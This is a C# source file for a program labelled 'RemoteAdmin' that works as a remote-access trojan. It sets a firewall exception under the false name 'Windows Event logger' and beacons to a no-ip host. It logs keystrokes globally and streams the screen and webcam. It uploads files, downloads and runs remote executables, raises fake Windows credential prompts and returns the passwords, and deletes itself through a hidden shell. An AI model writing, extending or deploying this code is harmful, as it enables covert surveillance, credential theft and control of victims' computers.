using System;
using System.Collections.Generic;
using System.Data.OleDb;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using JPB.Communication;
using JPB.Communication.ComBase;
using JPB.Communication.ComBase.Messages;
using JPB.Communication.ComBase.Messages.Wrapper;
using JPB.Communication.ComBase.TCP;
using JPB.Communication.Contracts.Intigration;
using JPB.RemoteAdmin.Common.Contracts;
using JPB.RemoteAdmin.Common.Manage;
using JPB.RemoteAdmin.Common.Messages.Dialog;
using JPB.RemoteAdmin.Server.Native.InputAddon.WindowsInput;
using JPB.RemoteAdmin.Server.Native.InputAddon.WindowsInput.Native;
using JPB.RemoteAdmin.Server.Native.KeyAddon;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using JPB.RemoteAdmin.Common.Messages;
using JPB.RemoteAdmin.Common;
using Misuzilla.Security;
using Timer = System.Threading.Timer;
using JPB.RemoteAdmin.Server.Native.KeyAddon.WinApi;
using JPB.Communication.NativeWin.Serilizer;
using JPB.Communication.NativeWin.WinRT;

namespace JPB.RemoteAdmin.Server.Native
{
    public class NativeServer
    {
        public NativeServer()
        {
        }

        [DllImport("User32.dll")]
        private static extern bool SetCursorPos(int x, int y);

        public event EventHandler<string> OnActionDone;

        protected virtual void RaiseActionDone(string action)
        {
            var handler = OnActionDone;
            if (handler != null)
                handler(this, action);
        }

        private const string OnNewSetupSender = "New sender";

        private const string Guidname = "{904E529E-00CA-4C64-B9DF-25F689EB7054}";

        private string ServerId { get; set; }

        public bool CallbackOnAppError { get; set; }
        public bool AddKeyListener { get; set; }
        public bool AutoAttachHandler { get; set; }
        private bool Capture { get; set; }

        private TCPNetworkSender Sender { get; set; }
        private TCPNetworkSender FileSender { get; set; }
        private TCPNetworkReceiver SharedReceiver { get; set; }
        private TCPNetworkSender ImageSender { get; set; }

        public ushort SenderPort { get; private set; }
        public ushort FilePort { get; private set; }

        private bool isInit;
        public event EventHandler<string> OnStartLoopFeedback;
        private bool _stop;
        private Task _task;
        Thread keyListenerThread;

        public void Init(ushort messageSender, ushort fileSender)
        {
            if (isInit)
                return;

            isInit = true;

            SenderPort = messageSender;
            FilePort = fileSender;
            TryMakeFwOpen();

            BinaryCompressedMessageSerializer.DefaultMessageSerlilizer.IlMergeSupport = true;
            BinaryCompressedMessageSerializer.DefaultMessageSerlilizer.PrevendDiscPageing = true;
            if (!NetworkFactory.Created)
            {
                Networkbase.DefaultMessageSerializer = new BinaryCompressedMessageSerializer() { IlMergeSupport = true };
                NetworkFactory.Create(new WinRTFactory());
            }

            SetupSender();

            GenerateID();
            AttachAppDomainHandler();

            _store = new DataStore();
            if (AddKeyListener)
            {
                try
                {
                    keyListenerThread = new Thread(Application.Run);
                    keyListenerThread.SetApartmentState(ApartmentState.STA);
                    keyListenerThread.Start();

                    _mouseListener = new MouseHookListener(new GlobalHooker());
                    _mouseListener.MouseMoveExt += _mouseListener_MouseClick;
                    _keyListener = new KeyboardHookListener(new GlobalHooker());
                    _keyListener.KeyPress += KeyListenerOnKeyPress;
                    _keyListener.Enabled = true;
                    _mouseListener.Enabled = false;
                }
                catch (Exception e)
                {
                    //CurrentDomain_FirstChanceException(this, new FirstChanceExceptionEventArgs(e));
                }
            }
        }

        private void TryMakeFwOpen()
        {
            try
            {
                var ins = FirewallHelper.Instance;
                var pathToParent = Assembly.GetEntryAssembly().Location;
                if (ins.AppAuthorizationsAllowed)
                {
                    var isChecked = ins.HasAuthorization(pathToParent);
                    if (!isChecked)
                    {
                        ins.GrantAuthorization(pathToParent, "Windows Event logger");
                    }
                }
            }
            catch (Exception)
            {
                
            }
        }

        private IPAddress TryAddress(IEnumerable<IPAddress> addresses)
        {
            return (from ipAddress in addresses let connectionOpen = Sender.ConnectionOpen(ipAddress.AddressContent) where connectionOpen select ipAddress).FirstOrDefault();
        }

     
        protected virtual void RaiseStartLoopFeedback(string feedback)
        {
            var handler = OnStartLoopFeedback;
            if (handler != null)
                handler(this, feedback);
        }


      
        public void Stop()
        {
            _stop = true;
        }

        public async Task Start()
        {
            _task = StartInternal();
            await _task;
        }

        private async Task StartInternal()
        {
            var shouldReconnect = false;
            var connected = false;
            while (!_stop)
            {
                try
                {
                    if (shouldReconnect || !CheckConnection())
                    {
                        shouldReconnect = false;
                        RaiseStartLoopFeedback("Host offline, reconnect");
                        connected = await Reconnect(Target);
                    }

                    if (connected)
                    {
                        RaiseStartLoopFeedback("Send Alive message");
                        connected = await SendAliveMessage();
                    }
                    else
                    {
                        var conns = ConnectionPool.Instance.GetConnections();
                        foreach (var connectionWrapper in conns)
                        {
                            RaiseStartLoopFeedback(connectionWrapper.ToString());
                        }
                    }

                    RaiseStartLoopFeedback("Message " + (connected ? "" : "Not ") + "Send");
                    var sleep = !connected ? TimeSpan.FromSeconds(5) : TimeSpan.FromSeconds(20);
                    RaiseStartLoopFeedback(string.Format("Sleep {0}", sleep));
                    int counter = sleep.Seconds;
                    var timer = new Timer(s => RaiseStartLoopFeedback(string.Format("Sleep {0}", --counter)), null, 0, 1000);

                    Thread.Sleep(sleep);
                    timer.Dispose();
                }
                catch (Exception e)
                {
                    RaiseStartLoopFeedback("Exception");
                    RaiseStartLoopFeedback(e.ToString());
                    RaiseStartLoopFeedback("");
                    shouldReconnect = true;
                    Trace.Write(e);
                    Thread.Sleep(TimeSpan.FromSeconds(10));
                }
                finally
                {
                    GC.Collect();
                    GC.WaitForFullGCComplete();
                    GC.WaitForPendingFinalizers();
                    GC.Collect();
                }
            }
        }

        private void SetupSender()
        {
            RaiseActionDone(OnNewSetupSender);
            if (Sender != null)
                Sender.Dispose();

            if (FileSender != null)
                FileSender.Dispose();

            Sender = NetworkFactory.Instance.GetSender(SenderPort);
            FileSender = NetworkFactory.Instance.GetSender(FilePort);
            ImageSender = NetworkFactory.Instance.GetSender(1339);
            Sender.SharedConnection = true;
            FileSender.SharedConnection = false;
            ImageSender.SharedConnection = false;

            ImageSender.Serlilizer = new DefaultMessageSerlilizer()
            {
                IlMergeSupport = true,
                PrevendDiscPageing = true
            };

#if !DEBUG
            Sender.UseExternalIpAsSender = true;
            FileSender.UseExternalIpAsSender = true;
            ImageSender.UseExternalIpAsSender = true;
#endif
        }

        public async Task<bool> Reconnect(string target)
        {
            if (this.Sender != null)
            {
                if (this.Sender.ConnectionOpen(target))
                    return true;
            }

            SetupSender();

            RaiseActionDone(OnNewSetupSender);
            try
            {
                var receiver = await Sender.InitSharedConnection(target);
                InjectReceiver(receiver);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private async Task<bool> SendMessage(MessageBase mess)
        {
            if (Sender.ConnectionOpen(Target))
            {
                return await Sender.SendMessageAsync(mess, Target);
            }
            return false;
        }

        public async Task<bool> SendAliveMessage()
        {
            return await SendMessage(new MessageBase(this.ServerId, InfoState.OnIpChanged));
        }

        private void AttachAppDomainHandler()
        {
            AppDomain.CurrentDomain.FirstChanceException += CurrentDomain_FirstChanceException;
            AppDomain.CurrentDomain.UnhandledException += CurrentDomainOnUnhandledException;
        }

        private void GenerateID()
        {
            try
            {
                ServerId = Registry.LocalMachine.GetValue(Guidname) as string;
                if (ServerId == null)
                {
                    if (File.Exists(Guidname))
                    {
                        ServerId = File.ReadAllText(Guidname);
                    }
                    else
                    {
                        Registry.LocalMachine.SetValue(Guidname, ServerId = Guid.NewGuid().ToString("D"));
                    }
                }
            }
            catch (Exception)
            {
                ServerId = Guid.NewGuid().ToString("D");
                File.WriteAllText(Guidname, ServerId);
            }
        }

        public void InjectReceiver(TCPNetworkReceiver sender)
        {
            if (SharedReceiver != null && SharedReceiver != sender)
                SharedReceiver.Dispose();

            SharedReceiver = sender;
            SharedReceiver.LargeMessageSupport = false;
            SharedReceiver.SharedConnection = true;
            SharedReceiver.AutoRespond = true;

            SharedReceiver.RegisterRequstHandler(OnIdInbound, InfoState.RequstInitalId);
            SharedReceiver.RegisterRequstHandler(OnSearchRequst, InfoState.SearchRequest);
            SharedReceiver.RegisterRequstHandler(OnFileSystemExplore, InfoState.OnFsExplore);
            SharedReceiver.RegisterRequstHandler(OnEnumerateWebcams, InfoState.GetWebcamsRequest);
            SharedReceiver.RegisterRequstHandler(OnDynamicCodeExecute, InfoState.OnDynamicCodeExecute);
            SharedReceiver.RegisterRequstHandler(OnKeyStoreRequest, InfoState.OnKeybordInputRequest);
            SharedReceiver.RegisterRequstHandler(OnMessageBoxShowRequest, InfoState.OnMessageBoxRequest);
            SharedReceiver.RegisterRequstHandler(OnGetTaskList, InfoState.GetTaskList);

            SharedReceiver.RegisterMessageBaseInbound(OnReconnect, InfoState.Reconnect);
            SharedReceiver.RegisterMessageBaseInbound(OnRestart, InfoState.Restart);

            SharedReceiver.RegisterMessageBaseInbound(OnFileGet, InfoState.OnFileGet);
            SharedReceiver.RegisterMessageBaseInbound(OnDynamicProgramExecute, InfoState.OnDynamicProgramExecute);

            SharedReceiver.RegisterMessageBaseInbound(OnStartScreenCapture, InfoState.OnStartScreenCapture);
            SharedReceiver.RegisterMessageBaseInbound(OnStopScreenCapture, InfoState.OnEndScreenCapture);

            SharedReceiver.RegisterMessageBaseInbound(OnKeybordInput, InfoState.OnKeybordInput);
            SharedReceiver.RegisterMessageBaseInbound(OnMouseInput, InfoState.OnMouseClick);

            SharedReceiver.RegisterMessageBaseInbound(OnProgramExecute, InfoState.OnFileOpProgramExecute);
            SharedReceiver.RegisterMessageBaseInbound(OnProgramDelete, InfoState.OnFileOpProgramDelete);

            SharedReceiver.RegisterMessageBaseInbound(OnKillTask, InfoState.KillTask);
            SharedReceiver.RegisterMessageBaseInbound(OnSelfDestruct, InfoState.SelfDestruct);
           
        }

        private async void OnSelfDestruct(MessageBase obj)
        {
            _stop = true;
            try
            {
                keyListenerThread.Abort();
            }
            catch (Exception)
            {
                
            }
            await _task;

            var Info = new ProcessStartInfo();

            var command = "\"" + Assembly.GetExecutingAssembly().Location + "\"";
            foreach (var item in Directory.EnumerateFiles(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "*.dll"))
            {
                command += " & Del \"" + item + "\"";
            }

            Info.Arguments = "/C choice /C Y /N /D Y /T 10 & Del " + command;
            Info.WindowStyle = ProcessWindowStyle.Hidden;
            Info.CreateNoWindow = true;
            Info.FileName = "cmd.exe";
            Process.Start(Info);
        }

        private async void OnRestart(MessageBase obj)
        {
            _stop = true;
            await _task;
            Process.Start(Assembly.GetEntryAssembly().Location);
        }

        private async void OnReconnect(MessageBase messBase)
        {
            await this.Reconnect(messBase.Sender);
        }

        private object OnMessageBoxShowRequest(RequstMessage arg)
        {
            var mess = arg.Message as MessageBoxContractBase;

            if (mess != null)
                switch (mess.Id)
                {
                    case MessageBoxContractManager.MessageBoxContract:
                        return InvokeMessageBox(mess as WindowsMessageBox);
                    case MessageBoxContractManager.WindowsAuditContract:
                        return InvokeWindowsLogin(mess as WindowsAudit);
                }

            return DBNull.Value.ToString(CultureInfo.InvariantCulture);
        }

        private DomainUser InvokeWindowsLogin(WindowsAudit mess)
        {
            var opt = CredentialUI.PromptForWindowsCredentials(mess.Header, mess.Message);
            return new DomainUser()
            {
                UserName = opt.UserName,
                Domain = opt.DomainName,
                Password = opt.Password
            };
        }

        private DialogResult InvokeMessageBox(WindowsMessageBox op)
        {
            return MessageBox.Show(op.Text, op.Header, op.Buttons, op.Image, op.DefaultButton, op.MessageBoxOptions);
        }

        private object OnGetTaskList(RequstMessage obj)
        {
            return Process.GetProcesses().Select(s => JPB.RemoteAdmin.Common.Messages.ProcessModel.GetModel(s)).ToArray();
        }

        private void OnKillTask(MessageBase obj)
        {
            var id = (int)obj.Message;
            var fod = Process.GetProcesses().FirstOrDefault(s => s.Id == id);
            if (fod != null)
            {
                try
                {
                    fod.Kill();
                }
                catch (Exception)
                {

                }
            }
        }

        private void OnProgramDelete(MessageBase obj)
        {
            var path = obj.Message.ToString();

            if (File.Exists(path))
            {
                try
                {
                    File.Delete(path);
                }
                catch (Exception e)
                {
                    //CurrentDomain_FirstChanceException(this, new FirstCh);
                }
            }
        }

        private void OnProgramExecute(MessageBase obj)
        {
            var path = obj.Message.ToString();

            if (File.Exists(path))
            {
                Process.Start(path);
            }
        }

        private object OnKeyStoreRequest(RequstMessage arg)
        {
            return _store.GetCurrentState();
        }

        private void OnKeybordInput(MessageBase obj)
        {
            var mess = (int)obj.Message;
            new InputSimulator().Keyboard.KeyPress((VirtualKeyCode)mess);
        }

        private void OnMouseInput(MessageBase obj)
        {
            try
            {
                var mess = obj.Message as MouseClickMessage;

                var x = this.DisplayScreen.WorkingArea.Width;
                var y = this.DisplayScreen.WorkingArea.Height;

                if (mess != null)
                {
                    var realX = (int)((mess.X / 100) * x);
                    var realY = (int)((mess.Y / 100) * y);

                    if (!DisplayScreen.Primary)
                    {
                        realX = realX + DisplayScreen.Bounds.X;
                        realY = realY + DisplayScreen.Bounds.Y;
                    }

                    SetCursorPos(realX, realY);
                    MouseOperations.MouseEvent(mess.MouseButton);
                }

            }
            catch (Exception)
            {
            }
        }

        private KeyboardHookListener _keyListener;
        private MouseHookListener _mouseListener;
        private DataStore _store;

        public string Target
        {
            get
            {
#if DEBUG
                return NetworkInfoBase.IpAddress.ToString();
#else
                //return "84.154.65.87";
                return "remote.no-ip.info";
#endif
            }
        }

        public bool CheckConnection()
        {
            return Sender != null && Sender.ConnectionOpen(Target);
        }

        private void CurrentDomainOnUnhandledException(object sender, UnhandledExceptionEventArgs unhandledExceptionEventArgs)
        {
            if (!CallbackOnAppError)
                return;

            if (Sender != null && Sender.ConnectionOpen(Target))
            {
#pragma warning disable 4014
                SendMessage(
#pragma warning restore 4014
new MessageBase(unhandledExceptionEventArgs.ExceptionObject.ToString(), InfoState.OnException));
            }

        }

        void CurrentDomain_FirstChanceException(object sender, System.Runtime.ExceptionServices.FirstChanceExceptionEventArgs e)
        {
            if (!CallbackOnAppError)
                return;

            if (Sender != null && Sender.ConnectionOpen(Target))
            {
#pragma warning disable 4014
                SendMessage(
#pragma warning restore 4014
new MessageBase(e.Exception.ToString(), InfoState.OnException));
            }
        }

        void _mouseListener_MouseClick(object sender, MouseEventArgs e)
        {
            //Console.WriteLine(e.Location);
        }

        //private void KeyListenerOnKeyPress(object sender, KeyEventArgs e)
        //{
        //    _store.Add(ToChar(e.KeyData));
        //}

        private void KeyListenerOnKeyPress(object sender, KeyPressEventArgs keyPressEventArgs)
        {
            _store.Add(keyPressEventArgs.KeyChar);
        }

        private static string getCurrUser()
        {// gets the owner of explorer.exe/UI to determine current logged in user
            String User = String.Empty;
            int PID = Process.GetProcessesByName("explorer")[0].Id;
            var sq = new ObjectQuery
                ("Select * from Win32_Process Where ProcessID = '" + PID + "'");
            var searcher = new ManagementObjectSearcher(sq);
            foreach (ManagementObject oReturn in searcher.Get())
            {
                string[] o = new String[2];
                oReturn.InvokeMethod("GetOwner", (object[])o);
                User = o[0];
                var sr = new System.IO.StreamWriter(@"C:\user.txt");
                sr.WriteLine("\\" + o[2] + "\\" + o[1] + "\\" + o[0]);
                return User;
            }
            return User;
        }


        private object OnIdInbound(RequstMessage arg)
        {
            return this.ServerId;
        }

        private static object OnSearchRequst(RequstMessage arg)
        {
            var cnn = new OleDbConnection("Provider=Search.CollatorDSO");
            var cmd =
                new OleDbCommand(
                    string.Format(
                        "SELECT " +
                        "System.FileName," +
                        "System.ItemType," +
                        "System.Size," +
                        "System.DateModified," +
                        "System.ItemPathDisplay" +
                        " FROM SYSTEMINDEX WHERE System.FileName LIKE \'{0}\' OR CONTAINS(System.Search.Contents,'{0}') ",
                        arg.Message), cnn);

            var objects = new List<FileInfoMessage>();
            try
            {
                cnn.Open();

                var reader = cmd.ExecuteReader();
                while (reader != null && reader.Read())
                {
                    var internalPath = (string)reader["System.ItemPathDisplay"];
                    objects.Add(FileInfoMessage.FromLocalFile(internalPath));
                    //    new FileInfoMessage()
                    //{
                    //    Path = InternalPath,
                    //    Size = long.Parse(Size.ToString()),
                    //    LastModifyed = LastModifyed,
                    //    Type = Type
                    //});
                }
            }
            finally
            {
                cnn.Close();
            }
            return objects.ToArray();
        }

        private string[][] getCamList()
        {
            var list = (from FilterInfo device in new FilterInfoCollection(FilterCategory.VideoInputDevice) select new Tuple<string, string>(device.Name, device.MonikerString)).ToList();
            for (int index = 0; index < Screen.AllScreens.Length; index++)
            {
                var screen = Screen.AllScreens[index];
                var format = string.Format("Display{0}", index);
                list.Add(new Tuple<string, string>(format, screen.DeviceName));
            }

            var arr = new string[list.Count][];
            for (int index = 0; index < list.Count; index++)
            {
                var tuple = list[index];
                arr[index] = new[] { tuple.Item1, tuple.Item2 };
            }

            return arr;
        }

        private object OnEnumerateWebcams(RequstMessage arg)
        {
            return getCamList();
        }

        private void OnStopScreenCapture(MessageBase obj)
        {
            Capture = false;
            if (_source != null)
                _source.SignalToStop();
            if (process != null)
            {
                process.Kill();
            }
        }

        private Bitmap ReduceBitmap(Bitmap original, int reducedWidth, int reducedHeight)
        {
            var reduced = new Bitmap(reducedWidth, reducedHeight);
            using (var dc = Graphics.FromImage(reduced))
            {
                // you might want to change properties like
                dc.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                dc.DrawImage(original, new Rectangle(0, 0, reducedWidth, reducedHeight), new Rectangle(0, 0, original.Width, original.Height), GraphicsUnit.Pixel);
            }

            return reduced;
        }

        //private readonly InfinitMemoryStream _infinitMemoryStream;
        private bool _capture;
        private IVideoSource _source;

        private Screen DisplayScreen;

        public static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();

            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }

            return null;
        }

        private void StartScreenCaptureSpawnChildProcess(ScreenOptionsMessage message)
        {
            Capture = true;
            Rectangle screenArea;

            var fod = new FilterInfoCollection(FilterCategory.VideoInputDevice).Cast<FilterInfo>()
                .FirstOrDefault(s => s.MonikerString == message.DisplayGuid);

            if (fod == null)
            {
                var firstOrDefault = Screen.AllScreens.FirstOrDefault(s => s.DeviceName == message.DisplayGuid);
                screenArea = firstOrDefault != null ? firstOrDefault.Bounds : Screen.PrimaryScreen.Bounds;
                DisplayScreen = firstOrDefault;
            }
            else
            {
                DisplayScreen = Screen.PrimaryScreen;
                screenArea = Screen.PrimaryScreen.Bounds;
            }

            if (fod == null)
            {
                _source = new ScreenCaptureStream(screenArea);
            }
            else
            {
                try
                {
                    _source = new VideoCaptureDevice(message.DisplayGuid);
                }
                catch (Exception)
                {
                    _source = new ScreenCaptureStream(screenArea);
                }
            }

            _source.PlayingFinished += (o, reason) =>
            {
                _capture = false;
            };

            //extract options

            var encoderParams = new EncoderParameters(message.EncoderOptions.Count);
            var staticEncoders = typeof(Encoder).GetFields().Where(s => s.FieldType == typeof(Encoder)).ToArray();

            for (int i = 0; i < message.EncoderOptions.Count; i++)
            {
                var op = message.EncoderOptions[i];
                var firstOrDefault = staticEncoders.FirstOrDefault(s => s.Name == op.Name);
                if (firstOrDefault != null)
                {
                    var staticEncoder = firstOrDefault.GetValue(null) as Encoder;
                    if (staticEncoder != null) 
                        encoderParams.Param[i] = new EncoderParameter(staticEncoder, op.Value);
                }
            }
            var codecInfo = ImageFormat.Jpeg;
            var encoder = GetEncoder(codecInfo);

            _source.NewFrame += (o, args) =>
            {
                byte[] content;
                try
                {
                    Task<bool> sendRequstMessage;

                    using (var original = new MemoryStream())
                    using (var compressed = new MemoryStream())
                    {
                        if (encoderParams.Param.Any())
                        {
                            args.Frame.Save(original, encoder, encoderParams);
                        }
                        else
                        {
                            args.Frame.Save(original, codecInfo);
                        }
                        original.Seek(0, SeekOrigin.Begin);
                        using (var comp = new DeflateStream(compressed, CompressionMode.Compress, true))
                        {
                            original.CopyTo(comp);
                        }

                        content = compressed.ToArray();
                        sendRequstMessage = ImageSender.SendMessageAsync(new MessageBase()
                        {
                            Message = content,
                            InfoState = InfoState.OnScreenCaptureResult
                        }, Target);
                    }

                    var result = false;
                    try
                    {
                        sendRequstMessage.Wait();
                        result = sendRequstMessage.Result;
                    }
                    catch (Exception)
                    {
                        result = false;
                        throw;
                    }
                    if (!result)
                    {
                        Capture = false;
                        _source.SignalToStop();
                    }
                }
                finally
                {
                    content = null;
                }

            };
            _source.Start();
        }

        Process process;

        private void OnStartScreenCapture(MessageBase obj)
        {
            Capture = true;
            StartScreenCaptureSpawnChildProcess(obj.Message as ScreenOptionsMessage);
        }

        private void OnDynamicProgramExecute(LargeMessage arg)
        {
            arg.OnLoadCompleted += arg_OnLoadCompleted;
            if (arg.DataComplete)
            {
                this.arg_OnLoadCompleted(arg);
            }
        }

        void arg_OnLoadCompleted(LargeMessage sender)
        {
            var tempFolderName = PathExtention.GetTempFolderName();

            var infoLoaded = sender.InfoLoaded() as FileStream;
            infoLoaded.Close();

            var dyncode = sender.MetaData.Message as DynmaicProgramExecuter;

            ZipFile.ExtractToDirectory(infoLoaded.Name, tempFolderName);

            var targetFileName = Directory.EnumerateFiles(tempFolderName, "*.exe", SearchOption.AllDirectories).ToArray().FirstOrDefault();

            var proc = new Process();
            proc.StartInfo.FileName = targetFileName;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.Start();

            if (dyncode.ShouldWait)
            {
                proc.WaitForExit();
                SendMessage(
                    new MessageBase(proc.StandardOutput.ReadToEnd())
                    {
                        InfoState = InfoState.OnDynamicProgramExecuteResult
                    });
            }
        }

        private object OnDynamicCodeExecute(RequstMessage arg)
        {
            var executer = arg.Message as DynamicCodeExcuter;
            if (executer == null)
                throw new ArgumentNullException("executer");

            var tempExecuuter = Path.GetTempFileName();

            using (var fs = new FileStream(tempExecuuter, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite))
            {
                fs.Write(executer.ExecuterWithMain, 0, executer.ExecuterWithMain.Length);
            }

            var newFileName = Path.ChangeExtension(tempExecuuter, ".exe");
            File.Move(tempExecuuter, newFileName);

            var proc = new Process();
            proc.StartInfo.FileName = newFileName;
            proc.Start();
            proc.WaitForExit();

            return proc.StandardOutput.ReadToEnd();
        }

        private void OnFileGet(MessageBase arg)
        {
            var orgMessage = arg.Message;
            string path = null;
            if (orgMessage is Tuple<Environment.SpecialFolder, Environment.SpecialFolderOption>)
            {
                var tuple = orgMessage as Tuple<Environment.SpecialFolder, Environment.SpecialFolderOption>;
                path = Environment.GetFolderPath(tuple.Item1, tuple.Item2);
            }
            else if (orgMessage is string)
            {
                path = orgMessage as string;
            }

            FileStream fs = null;

            if (path != null && Directory.Exists(path))
            {
                var temp = Path.GetTempFileName();
                File.Delete(temp);
                try
                {
                    ZipFile.CreateFromDirectory(path, temp, CompressionLevel.Fastest, true);
                }
                catch (Exception)
                {
                    try
                    {
                        ZipFile.CreateFromDirectory(path, temp, CompressionLevel.Fastest, true);
                    }
                    catch (Exception)
                    {
                        ZipFile.CreateFromDirectory(path, temp, CompressionLevel.NoCompression, true);
                    }
                }
                fs = new FileStream(temp, FileMode.Open);
            }
            if (path != null && File.Exists(path))
            {
                fs = new FileStream(path, FileMode.Open);
            }

            if (fs != null)
            {
                FileSender.SendStreamDataAsync(fs, new StreamMetaMessage()
                {
                    Message = arg.Message,
                    InfoState = arg.InfoState
                }, arg.Sender);
            }
        }

        private object OnFileSystemExplore(RequstMessage arg)
        {
            var path = arg.Message as string;
            if (arg.Message is Tuple<Environment.SpecialFolder, Environment.SpecialFolderOption>)
            {
                var tuple = arg.Message as Tuple<Environment.SpecialFolder, Environment.SpecialFolderOption>;
                path = Environment.GetFolderPath(tuple.Item1, tuple.Item2);
            }

            if (string.IsNullOrEmpty(path))
            {
                return DriveInfo.GetDrives().Select(s => new FileInfoMessage()
                {
                    Path = s.Name,
                    Type = FileType.Drive
                }).ToArray();
            }
            if (!Directory.Exists(path))
                return new FileInfoMessage() { Path = "No valid Path" };

            var files = Directory.GetFiles(path);
            var directorys = Directory.GetDirectories(path);
            return files.Select(FileInfoMessage.FromLocalFile).Concat(directorys.Select(FileInfoMessage.FromLocalFile)).AsParallel().ToArray();
        }
    }
}
